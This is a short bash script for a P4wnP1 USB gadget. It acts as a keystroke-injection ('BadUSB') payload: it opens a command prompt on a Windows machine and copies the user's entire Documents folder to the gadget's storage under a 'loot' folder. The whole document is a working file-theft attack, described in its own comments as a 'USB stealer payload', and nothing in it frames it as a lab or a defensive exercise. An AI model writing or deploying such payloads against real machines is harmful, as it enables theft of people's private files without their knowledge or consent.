#!/bin/bash

### Description: HID payload to steal target user files to USB storage
### Requirements: Composite gadget with HID + Mass Storage (mounted as D:\ or E:\ on Windows)

TARGET_DIR="C:\\Users\\%USERNAME%\\Documents"
USB_DRIVE="E:"

echo "[+] Injecting USB file exfiltration payload..."

/opt/p4wnp1/tools/hid_injector inject "GUI r"
sleep 1
/opt/p4wnp1/tools/hid_injector type "cmd.exe"
/opt/p4wnp1/tools/hid_injector inject "ENTER"
sleep 1

# Copy recursively
/opt/p4wnp1/tools/hid_injector type "xcopy /E /I /H \"$TARGET_DIR\" \"$USB_DRIVE\\loot\""
/opt/p4wnp1/tools/hid_injector inject "ENTER"

# Optional: Hide CMD window
/opt/p4wnp1/tools/hid_injector type "exit"
/opt/p4wnp1/tools/hid_injector inject "ENTER"

echo "[+] USB stealer payload executed. Check USB drive for data."

exit 0
